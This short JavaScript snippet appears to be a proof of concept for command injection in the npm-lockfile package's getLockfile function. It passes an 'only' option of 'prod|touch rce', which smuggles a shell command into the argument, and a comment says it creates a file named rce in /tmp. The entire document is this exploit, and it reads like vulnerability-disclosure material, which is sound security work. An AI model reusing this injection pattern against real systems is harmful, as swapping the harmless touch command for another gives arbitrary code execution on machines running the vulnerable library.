const getLockfile = require('npm-lockfile/getLockfile');
getLockfile("./package-lock.json", "08/01/2022",{"only":"prod|touch rce"}) // a file named rce will be created at /tmp

